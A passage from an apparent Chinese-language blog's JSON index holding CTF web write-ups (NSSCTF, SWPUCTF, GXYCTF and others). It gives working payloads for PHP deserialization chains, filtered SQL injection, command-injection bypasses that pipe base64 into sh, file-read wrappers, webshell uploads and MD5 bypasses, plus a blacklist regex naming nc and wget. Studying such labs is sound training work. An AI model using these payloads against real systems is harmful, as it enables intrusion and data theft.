&amp;&amp; $this-&gt;passwd ===&#x27;08067&#x27;)&#123; include(&#x27;flag.php&#x27;); echo $flag; &#125;else&#123; echo $this-&gt;admin; echo $this-&gt;passwd; echo &#x27;nono&#x27;; &#125; &#125; &#125; class w22m&#123; public $w00m; public function __destruct()&#123; echo $this-&gt;w00m; &#125; &#125; class w33m&#123; public $w00m; public $w22m; public function __toString()&#123; $this-&gt;w00m-&gt;&#123;$this-&gt;w22m&#125;(); return 0; &#125; &#125; $w00m = $_GET[&#x27;w00m&#x27;]; unserialize($w00m); ?&gt; 分析一波，首先找到flag的位置，我们应该是要最后调用Getflag()方法，然后来让他输出flag这里我们找下入口：传参$w00m,直接反序列化，入口就在__destruct，或者_wakeup，这里的w22m符合条件所以这里的__destruct()魔术方法是入口链子也很简单：首先__destruct()魔术方法去echo一个对象，然后就调用到了__toString()方法，然后通过w00m调用到了Getflag()，链子如下： 1__destruct()-&gt;w33m.__toString()-&gt;Getflag() exp为： 123456789101112131415161718192021222324252627282930313233&lt;?php class w44m&#123; private $admin = &#x27;w44m&#x27;; protected $passwd = &#x27;08067&#x27;; &#125; class w22m&#123; public $w00m; &#125; class w33m&#123; public $w00m; public $w22m; &#125; $a = new w22m(); //入口$a-&gt;w00m = new w33m; //通过__destruct()魔术方法调用__toString()$a-&gt;w00m-&gt;w00m = new w44m; //通过__toString()进入到w44m类$a-&gt;w00m-&gt;w22m = &quot;Getflag&quot;; /*看到__toString()方法里有这样一句: $this-&gt;w00m-&gt;&#123;$this-&gt;w22m&#125;(); 这里的w00m在上上句中赋值为了w44m类的实例化对象，所以可以猜到这里的$this这个字符串应该是Getflag，这样上面那句话就为$this-&gt;w44m-&gt;Getflag(); 这样就成功调用了Getflag()方法，输出flag*/echo urlencode(serialize($a)); //这里需要urlencode一下，因为w44m中有private和protected变量，序列化之后会有不可见字符?&gt; 最后直接GET传参即可 1?w00m=O%3A4%3A%22w22m%22%3A1%3A%7Bs%3A4%3A%22w00m%22%3BO%3A4%3A%22w33m%22%3A2%3A%7Bs%3A4%3A%22w00m%22%3BO%3A4%3A%22w44m%22%3A2%3A%7Bs%3A11%3A%22%00w44m%00admin%22%3Bs%3A4%3A%22w44m%22%3Bs%3A9%3A%22%00%2A%00passwd%22%3Bs%3A5%3A%2208067%22%3B%7Ds%3A4%3A%22w22m%22%3Bs%3A7%3A%22Getflag%22%3B%7D%7D NSSCTF{17d6721d-522e-465f-ba28-807adb29e4bf} [SWPUCTF 2021 新生赛]sql打开环境，页面提示有WAF测试步骤如下：（题目框提示了参数为wllm) 123456?wllm=1 //正常回显?wllm=1&#x27; //报错?wllm=1 1 //过滤了空格 --&gt; /**/?wllm=or //过滤了or?wllm=and //过滤了and?wllm=1=1 //过滤了= --&gt; like 所以payload如下： 12345678910?wllm=1&#x27;order/**/by/**/3%23 //正常回显?wllm=1&#x27;order/**/by/**/3%23 //报错，则证明有3列?wllm=-1&#x27;/**/union/**/select/**/1,2,3%23 //得出2，3为回显位?wllm=-1&#x27;/**/union/**/select/**/1,database(),3%23 //查数据库名，为test_db?wllm=-1&#x27;union/**/select/**/1,2,group_concat(table_name)/**/from/**/informa tion_schema.tables/**/where/**/table_schema/**/like/**/&#x27;test_db&#x27;%23 //得到表名有：LTLT_flag,users?wllm=-1&#x27;/**/union/**/select/**/1,group_concat(column_name),3/**/from/**/information_schema.columns/**/where/**/table_name/**/like/**/&#x27;LTLT_flag&#x27;%23//查询到列名有id,flag?wllm=-1&#x27;/**/union/**/select/**/1,group_concat(id,&#x27;~&#x27;,flag),3/**/from/**/test_db.LTLT_flag%23 好的，这里又只有一半，就像之前一样显示的不完全就像之前一样用mid()函数 123?wllm=-1&#x27;/**/union/**/select/**/1,mid(group_concat(flag),1,20),3/**/from/**/test_db.LTLT_flag%23?wllm=-1&#x27;/**/union/**/select/**/1,mid(group_concat(flag),15,20),3/**/from/**/test_db.LTLT_flag%23?wllm=-1&#x27;/**/union/**/select/**/1,mid(group_concat(flag),30,20),3/**/from/**/test_db.LTLT_flag%23 最后把三次读出来的拼一起即可NSSCTF&#123;6a640a43-e171-4a8d-93d0-451ef5110c7c&#125; [鹤城杯 2021]EasyP源码为： 123456789101112131415161718192021222324252627&lt;?php include &#x27;utils.php&#x27;; if (isset($_POST[&#x27;guess&#x27;])) &#123; $guess = (string) $_POST[&#x27;guess&#x27;]; if ($guess === $secret) &#123; $message = &#x27;Congratulations! The flag is: &#x27; . $flag; &#125; else &#123; $message = &#x27;Wrong. Try Again&#x27;; &#125; &#125; if (preg_match(&#x27;/utils\\.php\\/*$/i&#x27;, $_SERVER[&#x27;PHP_SELF&#x27;])) &#123; exit(&quot;hacker :)&quot;); &#125; if (preg_match(&#x27;/show_source/&#x27;, $_SERVER[&#x27;REQUEST_URI&#x27;]))&#123; exit(&quot;hacker :)&quot;); &#125; if (isset($_GET[&#x27;show_source&#x27;])) &#123; highlight_file(basename($_SERVER[&#x27;PHP_SELF&#x27;])); exit(); &#125;else&#123; show_source(__FILE__); &#125; ?&gt; 这道题有点懵，知识点没有怎么接触过首先看到题目 12345678if (isset($_POST[&#x27;guess&#x27;])) &#123; $guess = (string) $_POST[&#x27;guess&#x27;]; if ($guess === $secret) &#123; $message = &#x27;Congratulations! The flag is: &#x27; . $flag; &#125; else &#123; $message = &#x27;Wrong. Try Again&#x27;; &#125; &#125; 这一段，看似很简单，就直接输出flag了，但是实际上这里要满足的条件，secret参数根本找不到，所以这段根本就没有用，真的有用的是后面那些部分 $_SERVER[&#39;PHP_SELF&#39;],$_SERVER[&#39;REQUEST_URI&#39;],basename()函数的绕过那这里就先来了解一些前置知识： $_SERVER[&#39;PHP_SELF&#39;] 表示当前 php 文件相对于网站根目录的位置地址，与 document root 相关 比如：http://qingwan.top/index.php 则$_SERVER[‘PHP_SELF]的返回是 &#x2F;index.php $_SERVER[‘REQUEST_URI’]所有$_SERVER开头的都叫做预定义服务器变量 REQUEST_URI的作用是取得当前URI，也就是除域名外后面的完整的地址路径看看这两者的区别案例网址：https://qingwan.top/php/index.php/test/foo?username=qw` $_SERVER[&#39;PHP_SELF&#39;] 得到：/php/index.php/test/foo$_SERVER[&#39;REQUEST_URI&#39;] 得到：/php/index.php/test/foo?username=qw basement()函数：返回路径中的文件名部分首先这里要绕过那两个正则，这里用到了上面这三个知识点的一些属性 1231. basename()无法处理非ascii字符,即遇到非ascii字符会舍弃，那这里就绕过了第一个正则2. $_SERVER[&#x27;REQUEST_URI&#x27;]`不会将参数中的特殊符号进行转换， 也就是说它获取到的url上面的值，不会进行url解码 所以这里GET传参show_source时，由于有第一个正则，绕过了show_source，然后传入$_SERVER[&#39;PHP_SELF&#39;] 的值会进入basename()函数这里在我们可以在 index.php/utils.php 后面添加一个非ascii的字符串（比如一个汉字）或者%ff，即可绕过。 下划线的绕过show_source用show[source或者show.source绕过（绕过下划线的话可以考虑用 加号（+） 左中括号（[） 空格（ ） 点号（.）） 或者用url编码一下&#96;所以payload为： 12345/index.php/utils.php/%ff?73how_source=1/index.php/utils.php/%ff?show.source=1/index.php/utils.php/哈?show.source=1/index.php/utils.php/%81?show[source（这里必须得加上index.php(php网站的首页文件)，如果不加，会白屏） 这里还要记住一点，记得要用hackbar来传参NSSCTF&#123;66c093a4-43a8-48ad-8254-bc0e515d0c4b&#125; [NCTF 2018]签到题打开是百度的界面，url上有个/secret.php路由F12也什么都没有发现（后面看了网上的wp)需要Burp抓包，然后访问index.php，或者直接进入&#x2F;，之后就可以看到flag了，如果不用Burp，直接访问，会302进行一个跳转，又会重新跳转到/secret.php页面，所以我们还是得抓下包flag&#123;w3lc0m3_t0_nctf2018hhhhhhhhhhhh&#125; [GXYCTF 2019]Ping Ping Ping综合过滤，拼接绕过，base64编码绕过，Linux内联执行1234567891011121314127.0.0.1;ls //显示出了flag.php127.0.0.1;cat flag.php //不能执行，过滤了空格，这里用&lt;&gt;来绕过，而且也过滤了flag * [] ？&#123;&#125;127.0.0.1;a=g;tac$IFS$1fla$a.php //用$IFS$1代替空格，然后使用拼接绕过flag127.0.0.1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh //然后也可以用base64编码绕过，如果用上面那个代码的话，要记得执行之后查看源代码才看得到flag然后还有一种办法127.0.0.1;cat$IFS$9`ls` /*linux内联执行，执行之后查看源码，可以看到页面的源码和flag，因为有两个文件，这个相当于把这两个文件的内容都显示出来这里上面的payload都用的是tac，而不是cat，说下这两个的区别cat:由第一行开始显示内容，并将所有内容输出 tac:从最后一行倒序显示内容，并将所有内容输出*/ [NSSCTF 2022 Spring Recruit]ezgame查看源码说，分大于了65分就可以给flag（但是我真的是个游戏白痴，我连这个游戏怎么开始都不知道）根本看不到兔子…（没事了，后面发现我是傻呗，页面没有打开js)还是看源码吧，直接F12，查看Js文件，然后搜索nss就可以找到flag了NSSCTF&#123;6545e1fb-23ff-424c-8a34-7db9fd092d9d&#125; [SWPUCTF 2021 新生赛]finalrce打开之后看到源码 123456789101112131415 &lt;?phphighlight_file(__FILE__);if(isset($_GET[&#x27;url&#x27;]))&#123; $url=$_GET[&#x27;url&#x27;]; if(preg_match(&#x27;/bash|nc|wget|ping|ls|cat|more|less|phpinfo|base64|echo|php|python|mv|cp|la|\\-|\\*|\\&quot;|\\&gt;|\\&lt;|\\%|\\$/i&#x27;,$url)) &#123; echo &quot;Sorry,you can&#x27;t use this.&quot;; &#125; else &#123; echo &quot;Can you see anything?&quot;; exec($url); &#125;&#125; 看到过滤了很多东西，我们需要GET传参url，首先看到最后的执行命令的地方exec命令不回显，需要执行命令后保存到文件中。所以这里会用到tee重定向命令即把一个命令的回显写入另一个文件中 123?url=l\\s / | tee 1.txt //然后访问1.txt看到了flag文件?url=tac /flllll\\aaaaaaggggggg | tee 2.txt//这里注意！！！ | 符号的前后要有空格 [NISACTF 2022]checkin源码如下 123456789 &lt;?php error_reporting(0); include &quot;flag.php&quot;; // ‮⁦NISACTF⁩⁦Welcome to if (&quot;jitanglailo&quot; == $_GET[ahahahaha] &amp;‮⁦+!!⁩⁦&amp; &quot;‮⁦ Flag!⁩⁦N1SACTF&quot; == $_GET[‮⁦Ugeiwo⁩⁦cuishiyuan]) &#123; //tnnd! weishenme b echo $FLAG; &#125; show_source(__FILE__); ?&gt; 这就是看似简单，实际有点烧脑这题我是懵逼的，去网上看了wp这个题你直接传参： 1?ahahahaha=jitanglailo&amp;cuishiyuan=N1SACTF //但是发现不对，确实也不可能那么简单 这里在尝试复制的时候，就有点奇怪，他后面会跟着你前面的选中的字符变然后看网上的wp说把这堆代码用vscode打开就可以看到隐藏的那些字符然后GET传参的时候，把那些unicode字符也传进去就好了这道题的原理如下：我们看到了这里面的一些隐藏字符，比如U+202E之类的 E280AE从右往左强制符。根据内存顺序从右往左显示字符。它是Unicode编码U+202E转UTF-8对应的十六进制编码 E281A6这之间的字符从左到右显示，不影响外围字符。 对于这个特殊字符，它的Unicode编号为：U+2066 E281A9这个字符的Unicode编号为：U+2069 作用：作为RLI、LRI、FSi翻转结束的标识。payload如下：（也可以直接用winhex打开，然后直接复制相关的编码，加上%） 1?ahahahaha=jitanglailo&amp;%E2%80%AE%E2%81%A6Ugeiwo%E2%81%A9%E2%81%A6cuishiyuan=%E2%80%AE%E2%81%A6+Flag!%E2%81%A9%E2%81%A6N1SACTF NSSCTF&#123;955e2262-2036-4f03-bb1d-243137e499c6&#125;","categories":[{"name":"CTF做题wp","slug":"CTF做题wp","permalink":"https://qingwan.top/categories/CTF%E5%81%9A%E9%A2%98wp/"}],"tags":[],"author":"Qingwan"},{"title":"NSSCTF刷题记录①--web","slug":"nss①","date":"2024-01-08T05:09:31.676Z","updated":"2024-01-08T06:00:49.172Z","comments":true,"path":"2024/01/08/nss①/","link":"","permalink":"https://qingwan.top/2024/01/08/nss%E2%91%A0/","excerpt":"比较基础的一些web题① （但是因为这篇笔记是之前的笔记软件记的，语法有点不一样，所以格式可能看起来就有点丑丑的，怪怪的）","text":"比较基础的一些web题① （但是因为这篇笔记是之前的笔记软件记的，语法有点不一样，所以格式可能看起来就有点丑丑的，怪怪的） [SWPUCTF 2021 新生赛]jicao12345678&lt;?phphighlight_file(&#x27;index.php&#x27;);include(&quot;flag.php&quot;);$id=$_POST[&#x27;id&#x27;];$json=json_decode($_GET[&#x27;json&#x27;],true);if ($id==&quot;wllmNB&quot;&amp;&amp;$json[&#x27;x&#x27;]==&quot;wllm&quot;)&#123;echo $flag;&#125;?&gt; 要传两个参数，而且涉及到json解密 payload: 12/?json=&#123;&quot;x&quot;:&quot;wllm&quot;&#125; //get传参id=wllmNB //post传参 [SWPUCTF 2021 新生赛]easy_md512345678910111213141516171819&lt;?php highlight_file(__FILE__); include &#x27;flag2.php&#x27;; if (isset($_GET[&#x27;name&#x27;]) &amp;&amp; isset($_POST[&#x27;password&#x27;]))&#123; $name = $_GET[&#x27;name&#x27;]; $password = $_POST[&#x27;password&#x27;]; if ($name != $password &amp;&amp; md5($name) == md5($password))&#123; echo $flag; &#125; else &#123; echo &quot;wrong!&quot;; &#125; &#125;else &#123; echo &#x27;wrong!&#x27;;&#125;?&gt; 这里就是要要求传参的两个参数不等，但是她们md5加密之后要相等，这里是md5的==(弱比较绕过）的绕过有两种方法 md5强比较，弱比较，二次加密的绕过md5弱比较绕过： 1.0e绕过 弱比较会把0exxxx当做科学计数法，不管后面的值为任何东西，0的任何次幂都为0 下面收集一些md5值是以0e开头的数 12345678910111213141516171819QNKCDZO** 0e830400451993494058024219903391s878926199a** 0e545993274517709034328855841020s155964671a** 0e342768416822451524974117254469s214587387a** 0e848240448830537924465865611904s214587387a** 0e848240448830537924465865611904s878926199a** 0e545993274517709034328855841020s1091221200a** 0e940624217856561557816327384675s1885207154a** 0e509367213418206700842008763514240610708** 0e462097431906509019562988736854payload:?a=QNKCDZO&amp;b=240610708 2.数组绕过 md5()函数计算的是一个字符串的哈希值，对于数组则返回false 所以可以用数组来绕过 1payload:?a[]=1&amp;b[]=2 md5强比较绕过： 因为强类型比较，不仅比较值，还比较类型，0e会被当做字符串，所以不能用0e来进行但是我们可以用MD5值完全相同的字符来进行绕过 所以强比较只能用数组绕过 md5两次加密绕过： 12345678910111213CbDLytmyGm2xQyaLNhWnCbDLytmyGm2xQyaLNhWn770hQgrBOjrcqftrlaZk770hQgrBOjrcqftrlaZk770hQgrBOjrcqftrlaZk7r4lGXCH2Ksu2JNT3BYM7r4lGXCH2Ksu2JNT3BY payload： 所以这里直接用数组绕过即可： 12？name[]=a //get传参password[]=b //post传参 [SWPUCTF 2021 新生赛]caidao打开页面显示： 1@eval($_POST[&#x27;wllm&#x27;]; 直接蚁剑连接，密码为wllm [SWPUCTF 2021 新生赛]include打开环境显示让我们传一个file，盲猜是伪协议 先随便get传参一下file,随便赋值就可以然后看到题目源码 123456789101112131415161718 &lt;?phpini_set(&quot;allow_url_include&quot;,&quot;on&quot;);header(&quot;Content-type: text/html; charset=utf-8&quot;);error_reporting(0);$file=$_GET[&#x27;file&#x27;];if(isset($file))&#123; show_source(__FILE__); echo &#x27;flag 在flag.php中&#x27;;&#125;else&#123; echo &quot;传入一个file试试&quot;;&#125;echo &quot;&lt;/br&gt;&quot;;echo &quot;&lt;/br&gt;&quot;;echo &quot;&lt;/br&gt;&quot;;echo &quot;&lt;/br&gt;&quot;;echo &quot;&lt;/br&gt;&quot;;include_once($file);?&gt; flag 在flag.php中 php:&#x2F;&#x2F;filter伪协议知道在flag.php中，就直接伪协议 12?file=php://filter/read=convert.base64-encode/resource=flag.php//（针对php文件需要base64编码） [SWPUCTF 2021 新生赛]easyrce12345678 &lt;?phperror_reporting(0);highlight_file(__FILE__);if(isset($_GET[&#x27;url&#x27;]))&#123;eval($_GET[&#x27;url&#x27;]);&#125;?&gt; 直接传参执行命令，payload如下 12?url=system(&quot;ls /&quot;);?url=system(&quot;cat /flllllaaaaaaggggggg&quot;); [SWPUCTF 2021 新生赛]easy_sql简单的sql注入，步骤完整，联合注入类型打开环境，看到网址上方有提示说参数是wllm payload如下： 12345678?wllm=1 //有回显，存在sql注入 ?wllm=-1&#x27; or 1=1--+ //为字符型注入?wllm=1&#x27; order by 3--+ //判断列数，3列不报错，4列报错，有3列?wllm=-1&#x27; union select 1,2,3--+ //判断显示位，发现回显2，3则2和3是回显位?wllm=-1&#x27; union select 1,database(),3--+ //查询数据库名字--test_db?wllm=-1&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;test_db&#x27;--+ //查找表名回显 test_tb,users?wllm=-1%27%20union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;test_tb&#x27;--+ //查找字段，回显id和flag?wllm=-1&#x27; union select 1,group_concat(flag),3 from test_db.test_tb --+ //查找相应的数据 [第五空间 2021]WebFTP打开环境是一个登录页面，发现是webftf，一个老框架 框架的默认登录是admin/admin888 这道题的预期解是在github上下载源码，然后进行源码分析 访问下面这个路径，在phpinfo里找到flag/Readme/mytz.php?act=phpinfo 其实直接访问/phpinfo.php就可以了 [SWPUCTF 2021 新生赛]babyrce1234567891011&lt;?phperror_reporting(0);header(&quot;Content-Type:text/html;charset=utf-8&quot;);highlight_file(__FILE__);if($_COOKIE[&#x27;admin&#x27;]==1) &#123; include &quot;../next.php&quot;;&#125;else echo &quot;小饼干最好吃啦！&quot;;?&gt; payload如下 admin=1 //首先在cookie头传参，发现了rasalghul.php ，访问rasalghul.php内容如下： 12345678910111213 &lt;?phperror_reporting(0);highlight_file(__FILE__);error_reporting(0);if (isset($_GET[&#x27;url&#x27;])) &#123; $ip=$_GET[&#x27;url&#x27;]; if(preg_match(&quot;/ /&quot;, $ip))&#123; die(&#x27;nonono&#x27;); &#125; $a = shell_exec($ip); echo $a;&#125;?&gt; 看到这里有一个正则，他的意思是，输入的东西不能被目录分隔符包围，那对于我们的影响就是我们输入的payload里不能含有&#x2F;，payload如下（记住要一直保持cookie传参admin&#x3D;1) /rasalghul.php/?url=ls //回显 index.php rasalghul.php 过滤目录分割符&#x2F;的绕过目录分隔符的绕过，就用命令拼接 简单的原理就是，执行了第一个命令之后，接着就执行第二个命令，比如我们知道flag在flag_is_here这个文件夹的flag_xxx.php里，但是我们用不能用flag_is_here/cat flag_xxx.php，就可以用下面这个payload绕过 cd flag_is_here;cat flag_xxx.php 哟西，在我想怎么绕过的时候，我发现我搞错了，这里过滤的是空格，我就说怎么怎么输入都不对 过滤空格的绕过Linux下对空格的绕过： 1234567891011$&#123;IFS&#125;$IFS$9 //1-9都可以&lt;&gt;&lt;&gt;kg=$&#x27;\\x20flag.txt&#x27;&amp;&amp;cat$kg //(\\x20 转换成字符串就是空格，这里通过变量的方式巧妙绕过) URL绕过空格： 123%09%0a Windows绕过空格： （只有type这个命令可以用，type命令是打开某个文件的意思） （实用性不是很广，也就type这个命令可以用） 123.\\ //如type.\\flag.txt, // 如type,flag.txt 所以这道题的payload为 123/rasalghul.php/?url=ls/rasalghul.php/?url=ls$&#123;IFS&#125;/ //用$&#123;IFS&#125;绕过空格/rasalghul.php/?url=cat$&#123;IFS&#125;/flllllaaaaaaggggggg [陇剑杯 2021]签到这道题提醒是一道网络协议的流量分析，应该是flag文件藏在流量包中，我们需要分离flag文件 首先用wireshark打开pcapng附件,题目问可能是什么类型的攻击 直接猜http，发现就对了 NSSCTF&#123;http&#125; 但是如果找答案的话，那就统计-&gt;协议分级-&gt;然后看到http协议占比最多 [SWPUCTF 2021 新生赛]Do_you_know_http修改HTTP头的考察一些常见的需要修改http头的考察： 12345671.用....(地址，从本地登录）：**X-Forwarded-For**2. .发现 必须来自 的提示 : Referer3.使用...浏览器 : User-Agent4.管理员登录 ： 这个有一道题抓包之后有一个头是：cookie admin=0，然后我们改成1就可以了，要观察 应该就是考察Http头，点开环境，显示 1234567//Please use &#x27;WLLM&#x27; browser! 把User-Agent改成&#x27;WLLM&quot;/*You can only read this at local!Your address52.194.189.7*/添加X-Forwarded-For头，值为127.0.0.1 [SWPUCTF 2021 新生赛]ez_unserialize打开环境，是一个动图，F12查看源码，也没有什么有用的东西，那就来扫一下 扫到robots.txt和index.html两个文件，分别访问一下 发现提示，/cl45s.php，访问，得到源码 1234567891011121314151617181920212223242526272829&lt;?phperror_reporting(0);show_source(&quot;cl45s.php&quot;);class wllm&#123; public $admin; public $passwd; public function __construct()&#123; $this-&gt;admin =&quot;user&quot;; $this-&gt;passwd = &quot;123456&quot;; &#125; public function __destruct()&#123; if($this-&gt;admin === &quot;admin&quot; &amp;&amp; $this-&gt;passwd === &quot;ctf&quot;)&#123; include(&quot;flag.php&quot;); echo $flag; &#125;else&#123; echo $this-&gt;admin; echo $this-&gt;passwd; echo &quot;Just a bit more!&quot;; &#125; &#125;&#125;$p = $_GET[&#x27;p&#x27;];unserialize($p); poc为： 12345678&lt;?phpclass wllm&#123;public $admin=&quot;admin&quot;;public $passwd=&quot;ctf&quot;;&#125;$QW=new wllm();echo serialize($QW);?&gt; payload为： /cl45s.php/?p=O:4:&quot;wllm&quot;:2:&#123;s:5:&quot;admin&quot;;s:5:&quot;admin&quot;;s:6:&quot;passwd&quot;;s:3:&quot;ctf&quot;;&#125; [SWPUCTF 2021 新生赛]easyupload2.0打开环境是一个文件上传的界面，上传了一个图片马，显示上传成功，试试抓包修改后缀呢 但是改了之后，发现显示php是不行滴，所以php后缀不行 那如果php后缀不行的话，那就换个其他的后缀呗，可能黑名单过滤了php 文件上传php后缀的替代php3，php5，pht，phtml，phps都是php可运行的文件扩展名 那我们就再次抓包，把后缀改成phtml，这个后缀算是最常用的一个吧，这道题用pht也可以 上传成功，然后用蚁剑连接即可 （注意路径里不要加upload.php,直接http:.../upload/include.phtml [SWPUCTF 2021 新生赛]no_wakeup打开环境，看到源码 根据题目名字和代码，我们可以知道应该是要绕过__wakeup()魔术方法，因为如果触发了__wakeup()那我们传入的passwd的值就变了 反序列化绕过__wakeup__wakeup()魔术方法，在反序列化时会自动调用 绕过方法为： 序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行 （我们等会就拿这道题目举例子吧，但是就是这个绕过方法适用的php的版本比较低)适用版本： PHP5 &lt; 5.6.25 PHP7 &lt; 7.0.10 这里贴上一篇文章（里面讲了四五种绕过__wakeup的方法，如果是比较高版本的php的话，就可以参照这篇文章里的绕过方法） __wakeup的一些绕过方法 这道题我们的poc为： 12345678&lt;?phpclass HaHaHa&#123;public $admin=&quot;admin&quot;;public $passwd=&quot;wllm&quot;;&#125;$QW=new HaHaHa();echo serialize($QW);?&gt; payload为 12345//原来的：O:6:&quot;HaHaHa&quot;:2:&#123;s:5:&quot;admin&quot;;s:5:&quot;admin&quot;;s:6:&quot;passwd&quot;;s:4:&quot;wllm&quot;;&#125;/*因为我们要让对象属性个数的值大于真实的属性个数，所以直接把后面的2改个比2大的数字就可以了*//?p=O:6:&quot;HaHaHa&quot;:6:&#123;s:5:&quot;admin&quot;;s:5:&quot;admin&quot;;s:6:&quot;passwd&quot;;s:4:&quot;wllm&quot;;&#125; [suctf 2019]EasySQL打开环境，显示 12345678//在输入框内输入1 //有正常回显1&#x27; //无回显1&#x27; or &#x27;1&#x27;=&#x27;1&#x27;# //回显nonono,用and语句也是一样，应该是过滤了一些关键词//试了联合查询的语句全部报错了，这里我就有些懵了，去看了wp，然后发现是堆叠注入1;show databases# //查库1;show tables# //查表，发现flag，接下来就是怎么查看他的问题1;show columns from &#x27;Flag&#x27;# //这里是nonono 接下来看wp，说这道题是要去猜他的后端语句可能是什么样的 （下面的是网上的博主解释的） 输入非零数字得到的回显1和输入其余字符得不到回显&#x3D;&gt;来判断出内部的查询语句可能存在有||,即只有第一个命令成功执行，才会执行后面的命令 也就是select 输入的数据||内置的一个列名 from 表名即为后台语句为：select $post[&#39;query&#39;]||flag from Flag 测试语句：1 拼接效果为：select 1||flag from Flag 这里我们就需要输入$post[&#39;query&#39;] 关于sql_mode（摘抄于网上的博主，并非原创） 它定义了 MySQL 应支持的 SQL 语法，以及应该在数据上执行何种确认检查，其中的PIPES_AS_CONCAT将 ||视为字符串的连接操作符而非 “或” 运算符，所以当设置了sql_mode的PIPES_AS_CONCAT时候，||就相当于是concat()函数， 当 sql_mode 没有设置 PIPES_AS_CONCAT 时 （默认没有设置），|| 就是逻辑或，相当于OR函数 在oracle 缺省支持 通过 ‘ || ’ 来实现字符串拼接。 但在mysql 缺省不支持。需要调整mysql 的sql_mode 模式：pipes_as_concat 来实现oracle 的一些功能 综上，我们的payload为 1234567891011*,1 //这是非预期的payload/*当我们输入上面的payload之后，后台的语句变成了select *,1||flag from Flag，就是select *,1 from Flag，这样就直接查询出了Flag表中的所有内容。此处的1是临时增加一列，列名为1且这一列的所有值都为1还有一个注意点，在这个模式下进行查询的时候，使用字母连接会报错，使用数字连接才会查询出数据，因为这个 || 相当于是将 select 1 和 select flag from flag 的结果拼接在一起*/1;set sql_mode=PIPES_AS_CONCAT;select 1 //这是预期的官方payload//如果没有加set sql_mode=PIPES_AS_CONCAT，那||在mysql中就会默认是或运算，即如果command1执行失败，则执行command2，但是由于开头是1，所以command1不可能执行失败，所以我们必须要set一下这个模式","categories":[{"name":"CTF做题wp","slug":"CTF做题wp","permalink":"https://qingwan.top/categories/CTF%E5%81%9A%E9%A2%98wp/"}],"tags":[],"author":"Qingwan"},{"title":"新滴开始","slug":"1","date":"2023-11-20T13:11:37.079Z","updated":"2024-01-08T07:56:12.546Z","comments":true,"path":"2023/11/20/1/","link":"","permalink":"https://qingwan.top/2023/11/20/1/","excerpt":"换博客之后的第一篇文章~ 新的开始啦","text":"换博客之后的第一篇文章~ 新的开始啦 鼠了，咱就是说上一个博客的数据库毙了，也想着每年换服务器什么的麻烦，就顺便这次把博客换成github搭建的了。 呜呜呜本来想着有备份数据库，大不了就把之前的几十篇文章重新传一遍，结果发现备份的数据看的我脑壳昏。所以之前的博客的文章大概率都不会完全恢复了，不过也好，之前的文章有很多都囫囵吞枣的。尽量把之前写的比较明白的文章放回来，以后也尽量都更自己弄明白的写的好的文章嘻嘻~ 加油~","categories":[{"name":"随笔","slug":"随笔","permalink":"https://qingwan.top/categories/%E9%9A%8F%E7%AC%94/"}],"tags":[]}],"categories":[{"name":"大模型","slug":"大模型","permalink":"https://qingwan.top/categories/%E5%A4%A7%E6%A8%A1%E5%9E%8B/"},{"name":"Java学习","slug":"Java学习","permalink":"https://qingwan.top/categories/Java%E5%AD%A6%E4%B9%A0/"},{"name":"web","slug":"web","permalink":"https://qingwan.top/categories/web/"},{"name":"渗透","slug":"渗透","permalink":"https://qingwan.top/categories/%E6%B8%97%E9%80%8F/"},{"name":"CTF做题wp","slug":"CTF做题wp","permalink":"https://qingwan.top/categories/CTF%E5%81%9A%E9%A2%98wp/"},{"name":"代码审计","slug":"代码审计","permalink":"https://qingwan.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"name":"随笔","slug":"随笔","permalink":"https://qingwan.top/categories/%E9%9A%8F%E7%AC%94/"}],"tags":[]}